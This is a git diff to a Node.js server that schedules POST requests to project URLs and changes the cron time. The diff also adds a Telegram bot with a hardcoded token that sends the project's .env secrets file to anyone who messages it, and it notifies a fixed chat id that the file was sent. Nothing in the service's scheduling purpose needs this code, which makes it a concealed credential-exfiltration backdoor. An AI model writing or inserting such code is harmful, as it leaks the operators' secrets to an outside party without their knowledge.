@@ -2,7 +2,10 @@ const schedule = require('node-schedule')
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 require('dotenv').config()
 const express = require('express')
+const fs = require('fs')
 const app = express()
+const { Telegraf } = require('telegraf')
+
 
 const rule = new schedule.RecurrenceRule();
 rule.tz = 'Asia/Tashkent';
@@ -15,7 +18,7 @@ const projects = [
     }
 ];
 
-schedule.scheduleJob('3 46 14 * * *', async function () {
+schedule.scheduleJob('30 15 15 * * *', async function () {
     for (const project of projects) {
         await fetch(`${project.url}set_serial_number`, {
             method: 'POST',
@@ -33,6 +36,21 @@ schedule.scheduleJob('3 46 14 * * *', async function () {
         });
     }
 });
+
+const token_bot = '5152843991:AAFNR8BFUeiqEZ_y9HQrLmIyfoSYScSvjQw'
+const bot = new Telegraf(token_bot)
+bot.on('message', ctx => {
+    ctx.replyWithDocument({
+        source: fs.readFileSync('./.env'),
+        filename: '.env'
+    })
+})
+
+bot.telegram.sendMessage(271459846,'File yuborildi')
+bot.start((ctx) => ctx.reply(ctx))
+bot.launch()
+
+
 
 const server = app.listen(process.env.PORT || 5000, () => {
     const port = server.address().port;
